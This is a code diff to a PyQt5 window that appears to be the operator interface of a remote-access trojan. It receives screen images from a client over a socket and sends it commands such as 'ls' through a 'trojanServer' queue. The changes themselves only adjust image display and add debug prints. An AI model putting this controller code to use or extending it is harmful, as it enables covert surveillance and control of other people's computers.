@@ -5,9 +5,10 @@ import sys
 from threading import Thread
 
 from PIL.Image import frombytes
+from PIL import ImageQt
 from PyQt5 import QtWidgets
 from PyQt5.QtCore import pyqtSignal, Qt, QSize
-from PyQt5.QtGui import QPixmap, QPalette
+from PyQt5.QtGui import QPixmap, QPalette, QImage
 from PyQt5.QtWidgets import QWidget, QApplication, QListWidgetItem, QHBoxLayout, QLabel, QFileDialog, QMessageBox
 
 from Detail import Ui_Form
@@ -41,7 +42,7 @@ class DetailMain(QWidget, Ui_Form):
         self.recvThread = None
         self.socket = None
         self.flushtime.setText(str(5))
-        self.screenwidth = 700
+        self.screenwidth = 300
         self.bind()
 
     def bind(self):
@@ -90,8 +91,21 @@ class DetailMain(QWidget, Ui_Form):
         self.trojanServer.cmdQ.put("msg %d ls"%self.ck)
 
     def displayPic(self, qmp:QPixmap):
-        size = qmp.size()
-        qmp = qmp.scaled(self.screenwidth, int(size.height()*( self.screenwidth / size.width())))
+        # size = qmp.size()
+        # width = qmp.width()  ##获取图片宽度
+        # height = qmp.height()
+        # #qmp.data
+        # #print("position1")
+        # if width / self.pic_label.width() >= height / self.pic_label.height(): ##比较图片宽度与label宽度之比和图片高度与label高度之比
+        #     ratio = width / self.pic_label.width()
+        # else:
+        #     ratio = height / self.pic_label.height()
+        # new_width = width / ratio  ##定义新图片的宽和高
+        # new_height = height / ratio
+        # print("position1")
+        #qmp = qmp.scaled(new_width, new_height)
+            #qmp = qmp.scaled(self.screenwidth, int(size.height()*( self.screenwidth / size.width())))
+        print("position2")
         self.pic_label.setPixmap(qmp)
 
     def localWidthChange(self):
@@ -122,10 +136,13 @@ class DetailMain(QWidget, Ui_Form):
                         d = self.socket.recv(12)
                         data = struct.unpack('iii', d)
                         width, height, pic_len = data
+                        picmessage = "width:"+str(width)+"height:"+str(height)+"pic_len:"+str(pic_len)
+                        print(picmessage)
                         body = self.tcpPieceRecv(pic_len, self.socket, 1024)
                         try:
                             im = frombytes(data=body, size=(width, height), mode="RGB", decoder_name='raw')
-                            self.pic_signal.emit(im.toqpixmap())
+                            print(type(im))
+                            self.pic_signal.emit(ImageQt.toqpixmap(im))
                         except:
                             STD("图片错误")
                     elif ty == "response":
